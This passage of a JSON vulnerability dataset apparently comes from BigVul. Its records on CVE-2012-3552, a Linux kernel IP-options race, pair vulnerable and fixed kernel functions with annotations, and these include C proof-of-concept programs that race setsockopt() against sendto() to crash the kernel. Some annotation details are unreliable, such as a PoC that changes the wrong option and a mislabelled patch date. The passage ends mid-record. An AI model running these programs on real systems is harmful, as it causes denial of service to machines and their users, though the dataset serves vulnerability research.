        "solutions": "int ip_options_get_from_user(struct net *net, struct ip_options **optp,\nint ip_options_get_from_user(struct net *net, struct ip_options_rcu **optp,\n \t\t\t     unsigned char __user *data, int optlen)\n {\n\tstruct ip_options_rcu *opt = ip_options_get_alloc(optlen);\n \n \tif (!opt)\n \t\treturn -ENOMEM;\n\tif (optlen && copy_from_user(opt->opt.__data, data, optlen)) {\n \t\tkfree(opt);\n \t\treturn -EFAULT;\n \t}\n \treturn ip_options_get_finish(net, optp, opt, optlen);\n }\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_output.c": " int ip_build_and_send_pkt(struct sk_buff *skb, struct sock *sk,\n\t\t\t  __be32 saddr, __be32 daddr, struct ip_options *opt)\n {\n \tstruct inet_sock *inet = inet_sk(sk);\n \tstruct rtable *rt = skb_rtable(skb);\n \tstruct iphdr *iph;\n \n \t/* Build the IP header. */\n\tskb_push(skb, sizeof(struct iphdr) + (opt ? opt->optlen : 0));\n \tskb_reset_network_header(skb);\n \tiph = ip_hdr(skb);\n \tiph->version  = 4;\n\tiph->ihl      = 5;\n\tiph->tos      = inet->tos;\n\tif (ip_dont_fragment(sk, &rt->dst))\n\t\tiph->frag_off = htons(IP_DF);\n\telse\n\t\tiph->frag_off = 0;\n\tiph->ttl      = ip_select_ttl(inet, &rt->dst);\n\tiph->daddr    = rt->rt_dst;\n\tiph->saddr    = rt->rt_src;\n \tiph->protocol = sk->sk_protocol;\n \tip_select_ident(iph, &rt->dst, sk);\n \n\tif (opt && opt->optlen) {\n\t\tiph->ihl += opt->optlen>>2;\n\t\tip_options_build(skb, opt, daddr, rt, 0);\n \t}\n \n \tskb->priority = sk->sk_priority;\n\tskb->mark = sk->sk_mark;\n\n\t/* Send it out. */\n\treturn ip_local_out(skb);\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in Linux IP implementation socket options handling\n\nDisclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\nAffected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\nCWE/CVE Number and description:\nCWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)\n\nSummary:\nA race condition exists in the Linux kernel's IP implementation in the ip_build_and_send_pkt() function in net/ipv4/ip_output.c. The function accesses the inet->opt socket option structure without synchronization, allowing a concurrent thread to modify or free the structure. When a remote attacker sends packets to an application that sets socket options during network traffic handling, the race condition can be triggered, causing the kernel to access freed memory and leading to slab corruption and system crash (DoS).\n\nRoot cause:\nThe inet->opt (ip_options) structure lacks RCU (Read-Copy-Update) synchronization, allowing concurrent modification of the pointer and underlying structure while ip_build_and_send_pkt() accesses it without locks.\n\nAttack Surface:\nLinux kernel IP network stack, specifically the socket options handling path used during outbound packet transmission.\n\nImpact Summary:\nDenial of Service (slab corruption and system crash)\n\nTrigger / Attack vector:\nRemote packet transmission to an application that modifies socket options concurrently with outbound packet processing.\n\nKey code/struct excerpt (minimal):\n```c\nint ip_build_and_send_pkt(struct sk_buff *skb, struct sock *sk,\n                          __be32 saddr, __be32 daddr, struct ip_options *opt)\n{\n    struct inet_sock *inet = inet_sk(sk);\n    struct rtable *rt = skb_rtable(skb);\n    struct iphdr *iph;\n\n    skb_push(skb, sizeof(struct iphdr) + (opt ? opt->optlen : 0));\n    ...\n    if (opt && opt->optlen) {\n        iph->ihl += opt->optlen>>2;\n        ip_options_build(skb, opt, daddr, rt, 0);\n    }\n    ...\n}\n```\n\nExploit:\n\nTrigger surface/attack vector:\nNetwork packet transmission with concurrent socket option modification via setsockopt() calls.\n\nExploit primitive(s) available:\nUse-after-free write, slab corruption, arbitrary memory access through freed ip_options structure fields.\n\nExploitability summary (1 sentence):\nA multi-threaded or process-based attacker can trigger concurrent access to inet->opt by sending crafted packets while manipulating socket options, forcing the kernel to read/write pointer values or option data from freed memory.\n\nExploit script (summary, 3\u20136 bullets):\n- Open a socket and configure IP options via setsockopt()\n- In one thread, continuously modify the IP options (TTL, header options, etc.)\n- In another thread, trigger packet transmission (via sendto, sendmsg, or similar)\n- Race the modification thread to free/replace the ip_options structure during step 3\n- Trigger kernel access to the freed structure, causing slab corruption\n- Kernel crashes due to corrupted slab metadata or invalid pointer dereferences\n\nExploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <pthread.h>\n#include <unistd.h>\n\nvoid* modify_options(void *arg) {\n    int sock = *(int*)arg;\n    struct in_pktinfo pkt;\n    for (int i = 0; i < 10000; i++) {\n        int ttl = 64 + (i % 64);\n        setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));\n    }\n    return NULL;\n}\n\nvoid* send_packets(void *arg) {\n    int sock = *(int*)arg;\n    struct sockaddr_in dest;\n    char buffer[256] = \"test\";\n    memset(&dest, 0, sizeof(dest));\n    dest.sin_family = AF_INET;\n    dest.sin_port = htons(53);\n    dest.sin_addr.s_addr = htonl(0x08080808);\n    for (int i = 0; i < 10000; i++) {\n        sendto(sock, buffer, sizeof(buffer), 0, \n               (const struct sockaddr*)&dest, sizeof(dest));\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    pthread_t t1, t2;\n    pthread_create(&t1, NULL, modify_options, &sock);\n    pthread_create(&t2, NULL, send_packets, &sock);\n    pthread_join(t1, NULL);\n    pthread_join(t2, NULL);\n    close(sock);\n    return 0;\n}\n```\n\nFix\n\nFix code:\n```c\nint ip_build_and_send_pkt(struct sk_buff *skb, struct sock *sk,\n                          __be32 saddr, __be32 daddr, struct ip_options_rcu *opt)\n{\n    struct inet_sock *inet = inet_sk(sk);\n    struct rtable *rt = skb_rtable(skb);\n    struct iphdr *iph;\n\n    skb_push(skb, sizeof(struct iphdr) + (opt ? opt->opt.optlen : 0));\n    skb_reset_network_header(skb);\n    iph = ip_hdr(skb);\n    ...\n    if (opt && opt->opt.optlen) {\n        iph->ihl += opt->opt.optlen>>2;\n        ip_options_build(skb, &opt->opt, daddr, rt, 0);\n    }\n    ...\n}\n```\n\nFix summary:\nThe function signature was changed to accept struct ip_options_rcu *opt instead of struct ip_options *opt, and all accesses to the option structure were updated to access through opt->opt with RCU protection. This ensures proper synchronization and prevents use-after-free by wrapping the ip_options in an RCU-protected structure.\n\nPatch reference:\nCommit f6d8bd051c391c1c0458a30b2a7abcd939329259; https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\nPatch Analysis:\nThe fix introduces RCU (Read-Copy-Update) protection to inet->opt by creating a new ip_options_rcu wrapper structure. Instead of using atomic refcounts, the patch copies ip_options when necessary to avoid cache line dirtying and race conditions. The inet->opt pointer is now protected by RCU read-side critical sections.\n\nPatchType: Synchronization primitive added (RCU protection) and data structure wrapper introduced\n\nVariant & Triage Guidance\n\nVariant analysis suggestions:\n- Review other functions in net/ipv4/ip_output.c and related files that access inet->opt for similar race conditions\n- Check callers of ip_setup_cork() and ip_make_skb() to verify they properly handle the new ip_options_rcu structure\n- Audit other socket option accesses in the IPv4 and IPv6 stacks for similar synchronization issues\n\nLikely variants/impact (one line):\nSimilar race conditions may exist in other packet processing paths that access socket options without RCU protection (IPv6, raw sockets, multicast handling).",
        "tests": "NA",
        "solutions": " int ip_build_and_send_pkt(struct sk_buff *skb, struct sock *sk,\n\t\t\t  __be32 saddr, __be32 daddr, struct ip_options_rcu *opt)\n {\n \tstruct inet_sock *inet = inet_sk(sk);\n \tstruct rtable *rt = skb_rtable(skb);\n \tstruct iphdr *iph;\n \n \t/* Build the IP header. */\n\tskb_push(skb, sizeof(struct iphdr) + (opt ? opt->opt.optlen : 0));\n \tskb_reset_network_header(skb);\n \tiph = ip_hdr(skb);\n \tiph->version  = 4;\n\tiph->ihl      = 5;\n\tiph->tos      = inet->tos;\n\tif (ip_dont_fragment(sk, &rt->dst))\n\t\tiph->frag_off = htons(IP_DF);\n\telse\n\t\tiph->frag_off = 0;\n\tiph->ttl      = ip_select_ttl(inet, &rt->dst);\n\tiph->daddr    = rt->rt_dst;\n\tiph->saddr    = rt->rt_src;\n \tiph->protocol = sk->sk_protocol;\n \tip_select_ident(iph, &rt->dst, sk);\n \n\tif (opt && opt->opt.optlen) {\n\t\tiph->ihl += opt->opt.optlen>>2;\n\t\tip_options_build(skb, &opt->opt, daddr, rt, 0);\n \t}\n \n \tskb->priority = sk->sk_priority;\n\tskb->mark = sk->sk_mark;\n\n\t/* Send it out. */\n\treturn ip_local_out(skb);\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_output.c": "int ip_queue_xmit(struct sk_buff *skb)\n {\n \tstruct sock *sk = skb->sk;\n \tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ip_options *opt = inet->opt;\n \tstruct rtable *rt;\n \tstruct iphdr *iph;\n \tint res;\n\n\t/* Skip all of this if the packet is already routed,\n \t * f.e. by something like SCTP.\n \t */\n \trcu_read_lock();\n \trt = skb_rtable(skb);\n \tif (rt != NULL)\n \t\tgoto packet_routed;\n\n\t/* Make sure we can route this packet. */\n\trt = (struct rtable *)__sk_dst_check(sk, 0);\n\tif (rt == NULL) {\n\t\t__be32 daddr;\n \n \t\t/* Use correct destination address if we have options. */\n \t\tdaddr = inet->inet_daddr;\n\t\tif(opt && opt->srr)\n\t\t\tdaddr = opt->faddr;\n \n \t\t/* If this fails, retransmit mechanism of transport layer will\n \t\t * keep trying until route appears or the connection times\n\t\t * itself out.\n\t\t */\n\t\trt = ip_route_output_ports(sock_net(sk), sk,\n\t\t\t\t\t   daddr, inet->inet_saddr,\n\t\t\t\t\t   inet->inet_dport,\n\t\t\t\t\t   inet->inet_sport,\n\t\t\t\t\t   sk->sk_protocol,\n\t\t\t\t\t   RT_CONN_FLAGS(sk),\n\t\t\t\t\t   sk->sk_bound_dev_if);\n\t\tif (IS_ERR(rt))\n\t\t\tgoto no_route;\n\t\tsk_setup_caps(sk, &rt->dst);\n\t}\n \tskb_dst_set_noref(skb, &rt->dst);\n \n packet_routed:\n\tif (opt && opt->is_strictroute && rt->rt_dst != rt->rt_gateway)\n \t\tgoto no_route;\n \n \t/* OK, we know where to send it, allocate and build IP header. */\n\tskb_push(skb, sizeof(struct iphdr) + (opt ? opt->optlen : 0));\n \tskb_reset_network_header(skb);\n \tiph = ip_hdr(skb);\n \t*((__be16 *)iph) = htons((4 << 12) | (5 << 8) | (inet->tos & 0xff));\n\tif (ip_dont_fragment(sk, &rt->dst) && !skb->local_df)\n\t\tiph->frag_off = htons(IP_DF);\n\telse\n\t\tiph->frag_off = 0;\n\tiph->ttl      = ip_select_ttl(inet, &rt->dst);\n\tiph->protocol = sk->sk_protocol;\n\tiph->saddr    = rt->rt_src;\n \tiph->daddr    = rt->rt_dst;\n \t/* Transport layer set skb->h.foo itself. */\n \n\tif (opt && opt->optlen) {\n\t\tiph->ihl += opt->optlen >> 2;\n\t\tip_options_build(skb, opt, inet->inet_daddr, rt, 0);\n \t}\n \n \tip_select_ident_more(iph, &rt->dst, sk,\n\t\t\t     (skb_shinfo(skb)->gso_segs ?: 1) - 1);\n\n\tskb->priority = sk->sk_priority;\n\tskb->mark = sk->sk_mark;\n\n\tres = ip_local_out(skb);\n\trcu_read_unlock();\n\treturn res;\n\nno_route:\n\trcu_read_unlock();\n\tIP_INC_STATS(sock_net(sk), IPSTATS_MIB_OUTNOROUTES);\n\tkfree_skb(skb);\n\treturn -EHOSTUNREACH;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in Linux kernel IP stack socket options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Data in a Multithreaded Context (race condition)\n\n[Mandatory] Summary:\nThe vulnerable code in ip_queue_xmit() at net/ipv4/ip_output.c reads the socket's IP options pointer (inet->opt) without RCU synchronization. When an application sets socket options on one thread while another thread is sending packets through ip_queue_xmit(), the opt pointer can be freed and reallocated by the first thread while the second thread is actively using it, leading to use-after-free and slab corruption. The vulnerability occurs at line 4 where `struct ip_options *opt = inet->opt;` directly dereferences an unprotected pointer that can be modified concurrently.\n\n[Mandatory] Root cause:\ninet->opt pointer is accessed without RCU read-side protection, allowing concurrent modification and freeing of the ip_options structure while it is being used.\n\n[Mandatory] Attack Surface:\nNetwork stack; any application using UDP or TCP that sets socket options (IP_OPTIONS socket option) while network traffic is being sent.\n\n[Mandatory] Impact Summary:\nDenial of service via slab corruption and system crash\n\n[Optional] Trigger / Attack vector:\nConcurrent socket operations: one thread setting IP socket options via setsockopt() while another thread sends packets.\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nint ip_queue_xmit(struct sk_buff *skb)\n{\n\tstruct sock *sk = skb->sk;\n\tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ip_options *opt = inet->opt;  /* Unprotected concurrent access */\n\t/* ... */\n\tif(opt && opt->srr)\n\t\tdaddr = opt->faddr;\n\t/* ... */\n\tif (opt && opt->is_strictroute && rt->rt_dst != rt->rt_gateway)\n\t\tgoto no_route;\n\t/* ... */\n\tif (opt && opt->optlen) {\n\t\tiph->ihl += opt->optlen >> 2;\n\t\tip_options_build(skb, opt, inet->inet_daddr, rt, 0);\n\t}\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nConcurrent socket API calls: setsockopt() with IP_OPTIONS and sendto()/send()\n\n[Mandatory] Exploit primitive(s) available:\nRace condition enabling use-after-free of ip_options structure; arbitrary memory dereference leading to kernel memory corruption in slab allocator\n\n[Mandatory] Exploitability summary (1 sentence):\nThe exploit is highly reliable when timing controlled: a user-space process (no privilege required) can consistently trigger the race by threading rapid setsockopt(IP_OPTIONS) calls with sendto() calls on the same socket, corrupting kernel memory structures.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a UDP socket and bind it to a local address\n- Start one thread continuously calling setsockopt() with IP_OPTIONS to modify and free socket options\n- Start another thread continuously calling sendto() to send packets, invoking ip_queue_xmit()\n- The race condition causes the opt pointer to become stale while in use\n- Kernel dereferences freed memory, corrupting slab metadata\n- System crashes with slab corruption panic\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nstatic int sock;\nstatic volatile int stop_flag = 0;\n\nvoid* setsockopt_thread(void *arg) {\n\tunsigned char opt_buf[100];\n\twhile (!stop_flag) {\n\t\tmemset(opt_buf, 0x01, sizeof(opt_buf));\n\t\tsetsockopt(sock, IPPROTO_IP, IP_OPTIONS, opt_buf, sizeof(opt_buf));\n\t\tusleep(10);\n\t}\n\treturn NULL;\n}\n\nvoid* sendto_thread(void *arg) {\n\tstruct sockaddr_in addr;\n\tchar data[100] = \"test\";\n\tmemset(&addr, 0, sizeof(addr));\n\taddr.sin_family = AF_INET;\n\taddr.sin_port = htons(1234);\n\taddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\twhile (!stop_flag) {\n\t\tsendto(sock, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));\n\t\tusleep(10);\n\t}\n\treturn NULL;\n}\n\nint main() {\n\tsock = socket(AF_INET, SOCK_DGRAM, 0);\n\tpthread_t t1, t2;\n\tpthread_create(&t1, NULL, setsockopt_thread, NULL);\n\tpthread_create(&t2, NULL, sendto_thread, NULL);\n\tsleep(5);\n\tstop_flag = 1;\n\tpthread_join(t1, NULL);\n\tpthread_join(t2, NULL);\n\tclose(sock);\n\treturn 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nint ip_queue_xmit(struct sk_buff *skb)\n{\n\tstruct sock *sk = skb->sk;\n\tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ip_options_rcu *inet_opt;\n\tstruct rtable *rt;\n\tstruct iphdr *iph;\n\tint res;\n\n\trcu_read_lock();\n\tinet_opt = rcu_dereference(inet->inet_opt);\n\trt = skb_rtable(skb);\n\tif (rt != NULL)\n\t\tgoto packet_routed;\n\t/* ... */\n\tif(inet_opt && inet_opt->opt.srr)\n\t\tdaddr = inet_opt->opt.faddr;\n\t/* ... */\n\tif (inet_opt && inet_opt->opt.is_strictroute && rt->rt_dst != rt->rt_gateway)\n\t\tgoto no_route;\n\t/* ... */\n\tif (inet_opt && inet_opt->opt.optlen) {\n\t\tiph->ihl += inet_opt->opt.optlen >> 2;\n\t\tip_options_build(skb, &inet_opt->opt, inet->inet_daddr, rt, 0);\n\t}\n```\n\n[Mandatory] Fix summary:\nThe patch wraps inet->opt with RCU protection by introducing struct ip_options_rcu and using rcu_dereference() to safely read the pointer inside the RCU read-side critical section (rcu_read_lock/rcu_read_unlock). All references to opt are changed to inet_opt->opt with proper deref semantics, ensuring concurrent setsockopt() calls cannot cause use-after-free.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259\nMessage: \"inet: add RCU protection to inet->opt\"\n\n[Optional] Patch Analysis:\nThe fix introduces RCU read-side synchronization: the function now holds rcu_read_lock() while reading inet->opt via rcu_dereference(), guaranteeing the ip_options structure will not be freed concurrently. The structure was refactored from ip_options to ip_options_rcu to embed an RCU head for proper cleanup semantics.\n\nPatchType: Synchronization primitive addition (RCU protection)\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other callers of inet->opt throughout the IP stack (e.g., ip_make_skb, ip_setup_cork) for similar unprotected dereferences\n- Audit other socket option fields (inet_sk(sk)->inet_daddr, inet_saddr, etc.) accessed without synchronization\n- Fuzz concurrent setsockopt() and send operations on UDP/TCP sockets to detect similar race conditions\n\n[Optional] Likely variants/impact (one line):\nSimilar races in ip_make_skb() and ip_setup_cork() were also patched in the same commit to prevent parallel use-after-free and slab corruption.",
        "tests": "NA",
        "solutions": "int ip_queue_xmit(struct sk_buff *skb)\n {\n \tstruct sock *sk = skb->sk;\n \tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ip_options_rcu *inet_opt;\n \tstruct rtable *rt;\n \tstruct iphdr *iph;\n \tint res;\n\n\t/* Skip all of this if the packet is already routed,\n \t * f.e. by something like SCTP.\n \t */\n \trcu_read_lock();\n\tinet_opt = rcu_dereference(inet->inet_opt);\n \trt = skb_rtable(skb);\n \tif (rt != NULL)\n \t\tgoto packet_routed;\n\n\t/* Make sure we can route this packet. */\n\trt = (struct rtable *)__sk_dst_check(sk, 0);\n\tif (rt == NULL) {\n\t\t__be32 daddr;\n \n \t\t/* Use correct destination address if we have options. */\n \t\tdaddr = inet->inet_daddr;\n\t\tif (inet_opt && inet_opt->opt.srr)\n\t\t\tdaddr = inet_opt->opt.faddr;\n \n \t\t/* If this fails, retransmit mechanism of transport layer will\n \t\t * keep trying until route appears or the connection times\n\t\t * itself out.\n\t\t */\n\t\trt = ip_route_output_ports(sock_net(sk), sk,\n\t\t\t\t\t   daddr, inet->inet_saddr,\n\t\t\t\t\t   inet->inet_dport,\n\t\t\t\t\t   inet->inet_sport,\n\t\t\t\t\t   sk->sk_protocol,\n\t\t\t\t\t   RT_CONN_FLAGS(sk),\n\t\t\t\t\t   sk->sk_bound_dev_if);\n\t\tif (IS_ERR(rt))\n\t\t\tgoto no_route;\n\t\tsk_setup_caps(sk, &rt->dst);\n\t}\n \tskb_dst_set_noref(skb, &rt->dst);\n \n packet_routed:\n\tif (inet_opt && inet_opt->opt.is_strictroute && rt->rt_dst != rt->rt_gateway)\n \t\tgoto no_route;\n \n \t/* OK, we know where to send it, allocate and build IP header. */\n\tskb_push(skb, sizeof(struct iphdr) + (inet_opt ? inet_opt->opt.optlen : 0));\n \tskb_reset_network_header(skb);\n \tiph = ip_hdr(skb);\n \t*((__be16 *)iph) = htons((4 << 12) | (5 << 8) | (inet->tos & 0xff));\n\tif (ip_dont_fragment(sk, &rt->dst) && !skb->local_df)\n\t\tiph->frag_off = htons(IP_DF);\n\telse\n\t\tiph->frag_off = 0;\n\tiph->ttl      = ip_select_ttl(inet, &rt->dst);\n\tiph->protocol = sk->sk_protocol;\n\tiph->saddr    = rt->rt_src;\n \tiph->daddr    = rt->rt_dst;\n \t/* Transport layer set skb->h.foo itself. */\n \n\tif (inet_opt && inet_opt->opt.optlen) {\n\t\tiph->ihl += inet_opt->opt.optlen >> 2;\n\t\tip_options_build(skb, &inet_opt->opt, inet->inet_daddr, rt, 0);\n \t}\n \n \tip_select_ident_more(iph, &rt->dst, sk,\n\t\t\t     (skb_shinfo(skb)->gso_segs ?: 1) - 1);\n\n\tskb->priority = sk->sk_priority;\n\tskb->mark = sk->sk_mark;\n\n\tres = ip_local_out(skb);\n\trcu_read_unlock();\n\treturn res;\n\nno_route:\n\trcu_read_unlock();\n\tIP_INC_STATS(sock_net(sk), IPSTATS_MIB_OUTNOROUTES);\n\tkfree_skb(skb);\n\treturn -EHOSTUNREACH;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_output.c": "void ip_send_reply(struct sock *sk, struct sk_buff *skb, struct ip_reply_arg *arg,\n \t\t   unsigned int len)\n {\n \tstruct inet_sock *inet = inet_sk(sk);\n\tstruct {\n\t\tstruct ip_options\topt;\n\t\tchar\t\t\tdata[40];\n\t} replyopts;\n \tstruct ipcm_cookie ipc;\n \t__be32 daddr;\n \tstruct rtable *rt = skb_rtable(skb);\n \n\tif (ip_options_echo(&replyopts.opt, skb))\n \t\treturn;\n \n \tdaddr = ipc.addr = rt->rt_src;\n \tipc.opt = NULL;\n \tipc.tx_flags = 0;\n \n\tif (replyopts.opt.optlen) {\n \t\tipc.opt = &replyopts.opt;\n \n\t\tif (ipc.opt->srr)\n\t\t\tdaddr = replyopts.opt.faddr;\n \t}\n \n \t{\n\t\tstruct flowi4 fl4;\n\n\t\tflowi4_init_output(&fl4, arg->bound_dev_if, 0,\n\t\t\t\t   RT_TOS(ip_hdr(skb)->tos),\n\t\t\t\t   RT_SCOPE_UNIVERSE, sk->sk_protocol,\n\t\t\t\t   ip_reply_arg_flowi_flags(arg),\n\t\t\t\t   daddr, rt->rt_spec_dst,\n\t\t\t\t   tcp_hdr(skb)->source, tcp_hdr(skb)->dest);\n\t\tsecurity_skb_classify_flow(skb, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_key(sock_net(sk), &fl4);\n\t\tif (IS_ERR(rt))\n\t\t\treturn;\n\t}\n\n\t/* And let IP do all the hard work.\n\n\t   This chunk is not reenterable, hence spinlock.\n\t   Note that it uses the fact, that this function is called\n\t   with locally disabled BH and that sk cannot be already spinlocked.\n\t */\n\tbh_lock_sock(sk);\n\tinet->tos = ip_hdr(skb)->tos;\n\tsk->sk_priority = skb->priority;\n\tsk->sk_protocol = ip_hdr(skb)->protocol;\n\tsk->sk_bound_dev_if = arg->bound_dev_if;\n\tip_append_data(sk, ip_reply_glue_bits, arg->iov->iov_base, len, 0,\n\t\t       &ipc, &rt, MSG_DONTWAIT);\n\tif ((skb = skb_peek(&sk->sk_write_queue)) != NULL) {\n\t\tif (arg->csumoffset >= 0)\n\t\t\t*((__sum16 *)skb_transport_header(skb) +\n\t\t\t  arg->csumoffset) = csum_fold(csum_add(skb->csum,\n\t\t\t\t\t\t\t\targ->csum));\n\t\tskb->ip_summed = CHECKSUM_NONE;\n\t\tip_push_pending_frames(sk);\n\t}\n\n\tbh_unlock_sock(sk);\n\n\tip_rt_put(rt);\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in IP socket options handling\n\nDisclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\nAffected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\nCWE/CVE Number and description:\nCWE-362 (Concurrent Modification of Shared Resource Without Synchronization \u2013 Race Condition) / CVE-2012-3552\n\nSummary:\nA race condition exists in the Linux kernel's IP socket option handling, specifically in ip_send_reply() (net/ipv4/ip_output.c), where concurrent modification of the inet->opt pointer can occur between the time ip_options_echo() reads it and when the IP options are subsequently used. A remote attacker sending specially crafted packets to trigger the reply path while a concurrent thread modifies socket options can trigger a race condition that causes stale pointer dereferences or use-after-free, leading to slab corruption and kernel crash.\n\nRoot cause:\nThe inet->opt IP options pointer lacks proper synchronization (RCU protection), allowing one thread to modify inet->opt while another thread (handling the reply) reads or uses a stale or freed copy.\n\nAttack Surface:\nLinux kernel networking stack IP reply path (ip_send_reply function)\n\nImpact Summary:\nDenial of service via slab corruption and system crash\n\nTrigger / Attack vector:\nRemote network packets combined with concurrent socket option modifications (setsockopt)\n\nKey code/struct excerpt (minimal):\nstruct {\n\tstruct ip_options\topt;\n\tchar\t\t\t\tdata[40];\n} replyopts;\n\nif (replyopts.opt.optlen) {\n\tipc.opt = &replyopts.opt;\n\t\n\tif (ipc.opt->srr)\n\t\tdaddr = replyopts.opt.faddr;\n}\n\nExploit:\n\nTrigger surface/attack vector:\nRemote network packets triggering ip_send_reply() concurrently with socket option setsockopt() calls\n\nExploit primitive(s) available:\nRace condition enabling stale/freed 